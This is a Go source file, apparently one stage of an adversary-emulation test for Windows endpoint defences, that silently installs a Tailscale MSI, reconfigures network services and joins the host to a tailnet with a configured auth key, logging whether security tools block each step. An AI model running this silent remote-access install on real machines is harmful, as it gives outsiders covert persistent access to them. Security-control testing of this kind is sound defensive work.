//go:build windows
// +build windows

/*
STAGE 3: Remote Access Software (T1219)
Installs Tailscale MSI silently and connects to tailnet infrastructure
Combines T1543.003 (Windows Service) and T1219 (Remote Access Software)
*/

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "eafce2fc-75fd-4c62-92dc-32cabe5cf206"
	TECHNIQUE_ID   = "T1219"
	TECHNIQUE_NAME = "Remote Access Software"
	STAGE_ID       = 3

	// Tailscale CLI path after MSI installation
	TAILSCALE_CLI = "C:\\Program Files\\Tailscale\\tailscale.exe"
)

// Standardized stage exit codes
const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

const (
	SERVICE_STATE_FILE = "c:\\F0\\original_service_state.json"
)

// ServiceState represents the original state of a Windows service
type ServiceState struct {
	Name        string `json:"name"`
	StartupType string `json:"startup_type"` // "disabled", "manual", "auto", "auto_delayed"
	IsRunning   bool   `json:"is_running"`
}

func main() {
	// Attach to shared log
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting Tailscale MSI installation and connection")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Install Tailscale MSI and connect to tailnet")

	// Read authentication key
	config, err := readConfig()
	if err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Failed to read config: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "Configuration error")
		os.Exit(StageError)
	}

	authKey := config["AUTH_KEY"]
	if authKey == "" || authKey == "tskey-auth-REPLACE_ME_WITH_ACTUAL_KEY" {
		LogMessage("ERROR", TECHNIQUE_ID, "Tailscale auth key not configured")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "Auth key missing - replace placeholder in source code")
		os.Exit(StageError)
	}

	// Verify MSI exists
	msiPath := filepath.Join("c:\\F0", "tailscale-setup.msi")
	if _, err := os.Stat(msiPath); os.IsNotExist(err) {
		LogMessage("ERROR", TECHNIQUE_ID, "Tailscale MSI not found")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "tailscale-setup.msi missing from C:\\F0")
		os.Exit(StageError)
	}

	// Step 1: Capture original service states for cleanup restoration
	if err := captureServiceStates(); err != nil {
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("Failed to capture service states: %v", err))
		// Continue anyway - cleanup will still work, just won't restore original state
	}

	// Step 2: Enable required Windows services for Tailscale
	if err := enableRequiredServices(); err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Failed to enable required services: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "Service prerequisite configuration failed")
		os.Exit(StageError)
	}

	// Step 3: Install Tailscale MSI silently
	if err := installTailscaleMSI(msiPath); err != nil {
		// Check if installation was blocked
		if strings.Contains(err.Error(), "access denied") ||
			strings.Contains(err.Error(), "blocked") ||
			strings.Contains(err.Error(), "restricted") ||
			strings.Contains(err.Error(), "prevented") {

			fmt.Printf("[STAGE T1219] MSI installation blocked: %v\n", err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("MSI installation blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}

		fmt.Printf("[STAGE T1219] Installation failed: %v\n", err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Installation failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	// Step 4: Connect to tailnet
	if err := connectToTailnet(authKey); err != nil {
		// Check if connection was blocked
		if strings.Contains(err.Error(), "access denied") ||
			strings.Contains(err.Error(), "blocked") ||
			strings.Contains(err.Error(), "timeout") ||
			strings.Contains(err.Error(), "refused") {

			fmt.Printf("[STAGE T1219] Connection blocked: %v\n", err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Connection blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}

		fmt.Printf("[STAGE T1219] Connection failed: %v\n", err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Connection failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	// Step 5: Verify connection established
	if err := verifyConnection(); err != nil {
		// Network connection blocked
		if strings.Contains(err.Error(), "timeout") ||
			strings.Contains(err.Error(), "blocked") ||
			strings.Contains(err.Error(), "refused") {

			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Network blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}

		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Connection verification failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, "Tailscale installed and connected to tailnet")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Remote access software installed and connected")
	os.Exit(StageSuccess)
}

func installTailscaleMSI(msiPath string) error {
	LogMessage("INFO", TECHNIQUE_ID, "Installing Tailscale via MSI (silent mode)...")

	// Build msiexec command for silent installation
	// /i = install
	// /quiet = no UI
	// /norestart = don't reboot
	// TS_NOLAUNCH = don't launch GUI
	// TS_UNATTENDEDMODE = unattended mode for connection
	cmd := exec.Command("msiexec",
		"/i", msiPath,
		"/quiet",
		"/norestart",
		"TS_NOLAUNCH=yes",
		"TS_UNATTENDEDMODE=always")

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("msiexec failed: %v - %s", err, string(output))
	}

	LogMessage("INFO", TECHNIQUE_ID, "MSI installation initiated")

	// Wait for installation to complete and service to start
	LogMessage("INFO", TECHNIQUE_ID, "Waiting for Tailscale service to start...")
	time.Sleep(15 * time.Second)

	// Verify Tailscale CLI was installed
	if _, err := os.Stat(TAILSCALE_CLI); os.IsNotExist(err) {
		return fmt.Errorf("Tailscale CLI not found after installation - may have been blocked")
	}

	// Verify Tailscale service is running
	cmd = exec.Command("sc", "query", "Tailscale")
	output, err = cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("Tailscale service not found: %v", err)
	}

	if !strings.Contains(string(output), "RUNNING") {
		return fmt.Errorf("Tailscale service not running")
	}

	LogMessage("INFO", TECHNIQUE_ID, "Tailscale service installed and running")
	return nil
}

func connectToTailnet(authKey string) error {
	LogMessage("INFO", TECHNIQUE_ID, "Connecting to tailnet with auth key...")

	// Use installed Tailscale CLI to connect
	// --unattended is required for non-interactive execution
	cmd := exec.Command(TAILSCALE_CLI, "up",
		"--authkey="+authKey,
		"--accept-routes",
		"--unattended")

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("tailscale up failed: %v - %s", err, string(output))
	}

	LogMessage("INFO", TECHNIQUE_ID, "Tailscale connection command executed")
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Output: %s", string(output)))

	// Wait for connection to establish
	time.Sleep(5 * time.Second)

	return nil
}

func verifyConnection() error {
	LogMessage("INFO", TECHNIQUE_ID, "Verifying tailnet connection...")

	// Check connection status
	cmd := exec.Command(TAILSCALE_CLI, "status")

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("status check failed: %v", err)
	}

	outputStr := string(output)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Tailscale status output: %s", outputStr))

	// Check if connected (output should show 100.x.x.x IP addresses)
	if !strings.Contains(outputStr, "100.") {
		return fmt.Errorf("not connected to tailnet - no Tailscale IP found")
	}

	LogMessage("INFO", TECHNIQUE_ID, "Connection verified - endpoint accessible on tailnet")
	return nil
}

func captureServiceStates() error {
	LogMessage("INFO", TECHNIQUE_ID, "Capturing original service states for restoration...")

	services := []string{"iphlpsvc", "Dnscache", "netprofm", "WinHttpAutoProxySvc"}
	states := make(map[string]ServiceState)

	for _, svcName := range services {
		state := ServiceState{
			Name:        svcName,
			StartupType: getServiceStartupType(svcName),
			IsRunning:   isServiceCurrentlyRunning(svcName),
		}
		states[svcName] = state

		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Service %s: StartupType=%s, Running=%v",
			svcName, state.StartupType, state.IsRunning))
	}

	// Save states to JSON file
	jsonData, err := json.MarshalIndent(states, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal service states: %v", err)
	}

	if err := os.WriteFile(SERVICE_STATE_FILE, jsonData, 0644); err != nil {
		return fmt.Errorf("failed to write service state file: %v", err)
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Service states saved to %s", SERVICE_STATE_FILE))
	return nil
}

func getServiceStartupType(serviceName string) string {
	// Use sc qc to get service configuration
	cmd := exec.Command("sc", "qc", serviceName)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "unknown"
	}

	outputStr := string(output)

	// Parse START_TYPE from output
	// Example: "        START_TYPE         : 2   AUTO_START"
	if strings.Contains(outputStr, "DISABLED") {
		return "disabled"
	} else if strings.Contains(outputStr, "DEMAND_START") {
		return "manual"
	} else if strings.Contains(outputStr, "AUTO_START") {
		if strings.Contains(outputStr, "DELAYED") {
			return "auto_delayed"
		}
		return "auto"
	}

	return "unknown"
}

func isServiceCurrentlyRunning(serviceName string) bool {
	cmd := exec.Command("sc", "query", serviceName)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false
	}

	return strings.Contains(string(output), "RUNNING")
}

func enableRequiredServices() error {
	LogMessage("INFO", TECHNIQUE_ID, "Enabling required Windows services for Tailscale...")

	// Services required by Tailscale MSI installer
	requiredServices := []struct {
		name        string
		description string
	}{
		{"iphlpsvc", "IP Helper"},
		{"Dnscache", "DNS Client"},
		{"netprofm", "Network List Service"},
		{"WinHttpAutoProxySvc", "WinHTTP Web Proxy Auto-Discovery"},
	}

	for _, service := range requiredServices {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Configuring service: %s (%s)", service.name, service.description))

		// Set service to automatic startup
		cmd := exec.Command("sc", "config", service.name, "start=", "auto")
		output, err := cmd.CombinedOutput()
		if err != nil {
			LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("Failed to configure %s: %v - %s", service.name, err, string(output)))
			// Continue anyway - service might already be configured
		}

		// Start the service
		cmd = exec.Command("sc", "start", service.name)
		output, err = cmd.CombinedOutput()
		if err != nil {
			// Ignore error if service is already running
			if !strings.Contains(string(output), "already been started") {
				LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("Failed to start %s: %v - %s", service.name, err, string(output)))
			} else {
				LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Service %s already running", service.name))
			}
		} else {
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Service %s started successfully", service.name))
		}
	}

	LogMessage("INFO", TECHNIQUE_ID, "Required services configured")
	return nil
}

func readConfig() (map[string]string, error) {
	configPath := filepath.Join("c:\\F0", "test_config.txt")
	data, err := os.ReadFile(configPath)
	if err != nil {
		return nil, err
	}

	config := make(map[string]string)
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		parts := strings.SplitN(strings.TrimSpace(line), "=", 2)
		if len(parts) == 2 {
			config[parts[0]] = parts[1]
		}
	}

	return config, nil
}